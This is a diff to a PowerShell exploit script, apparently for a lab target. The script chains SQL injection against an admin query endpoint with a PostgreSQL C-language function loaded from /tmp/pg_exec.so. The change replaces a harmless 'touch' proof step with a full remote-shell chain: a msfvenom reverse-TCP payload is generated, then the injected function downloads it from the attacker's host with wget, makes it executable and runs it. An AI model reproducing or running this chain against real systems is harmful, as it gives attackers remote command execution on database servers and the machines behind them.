@@ -218,7 +218,9 @@ $xxe_payload = @"
       $create_udf_func_sqli = "CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE 'c' STRICT";
       $res = Invoke-WebRequest -Uri http://answers/admin/query -Method Post -Body "adminKey=$admin_key&query=$create_udf_func_sqli" -Websession $Session -Proxy http://localhost:8080;
       # 3f. trigger_udf
-      $trigger_udf_sqli = "SELECT sys('touch /tmp/gotcha.txt');"
+      msfvenom -p linux/x86/shell_reverse_tcp LHOST=$attacker_ip LPORT=4444 -f elf -o reverse.elf
+      $trigger_udf_sqli = "SELECT sys('wget http://$attacker_ip/reverse.elf -O /tmp/reverse.elf; chmod +x /tmp/reverse.elf; /tmp/reverse.elf');";
+      $trigger_udf_sqli = [System.Web.HttpUtility]::UrlEncode($trigger_udf_sqli);
       $res = Invoke-WebRequest -Uri http://answers/admin/query -Method Post -Body "adminKey=$admin_key&query=$trigger_udf_sqli" -Websession $Session -Proxy http://localhost:8080;
       break;
     }
